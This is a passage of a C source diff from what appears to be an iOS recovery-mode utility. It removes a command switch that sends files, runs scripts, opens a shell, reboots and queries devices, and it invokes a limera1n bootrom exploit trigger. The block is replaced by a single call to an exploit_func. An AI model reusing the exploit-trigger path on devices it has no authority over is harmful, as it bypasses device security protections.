-				error = irecv_send_file(client, argument, 0);
-				if (error != IRECV_E_SUCCESS) {
-					debug("%s\n", irecv_strerror(error));
-					break;
-				}
-			}
-			error = irecv_trigger_limera1n_exploit(client);
-			debug("%s\n", irecv_strerror(error));
-			break;
-
-		case kStartShell:
-			if (devinfo->pid == 0x1881) {
-				printf("This feature is not supported in Debug USB (KIS) mode.\n");
-				break;
-			}
-			init_shell(client);
-			break;
-
-		case kSendScript:
-			if (devinfo->pid == 0x1881) {
-				printf("This feature is not supported in Debug USB (KIS) mode.\n");
-				break;
-			}
-			buffer_read_from_filename(argument, &buffer, &buffer_length);
-			if (buffer) {
-				buffer[buffer_length] = '\0';
-
-				error = irecv_execute_script(client, buffer);
-				if (error != IRECV_E_SUCCESS) {
-					debug("%s\n", irecv_strerror(error));
-				}
-
-				free(buffer);
-			} else {
-				fprintf(stderr, "Could not read file '%s'\n", argument);
-			}
-			break;
-
-		case kShowMode: {
-			irecv_get_mode(client, &mode);
-			printf("%s Mode", mode_to_str(mode));
-			if (devinfo->pid == 0x1881) {
-				printf(" via Debug USB (KIS)");
-			}
-			printf("\n");
-			break;
-		}
-		case kRebootToNormalMode:
-			if (devinfo->pid == 0x1881) {
-				printf("This feature is not supported in Debug USB (KIS) mode.\n");
-				break;
-			}
-			error = irecv_setenv(client, "auto-boot", "true");
-			if (error != IRECV_E_SUCCESS) {
-				debug("%s\n", irecv_strerror(error));
-				break;
-			}
-
-			error = irecv_saveenv(client);
-			if (error != IRECV_E_SUCCESS) {
-				debug("%s\n", irecv_strerror(error));
-				break;
-			}
-
-			error = irecv_reboot(client);
-			if (error != IRECV_E_SUCCESS) {
-				debug("%s\n", irecv_strerror(error));
-			} else {
-				debug("%s\n", irecv_strerror(error));
-			}
-			break;
-
-		case kQueryInfo:
-			print_device_info(client);
-			break;
-
-		default:
-			fprintf(stderr, "Unknown action\n");
-			break;
-	}
-
-	irecv_close(client);
-
-	return 0;
+    return exploit_func(client);
 }
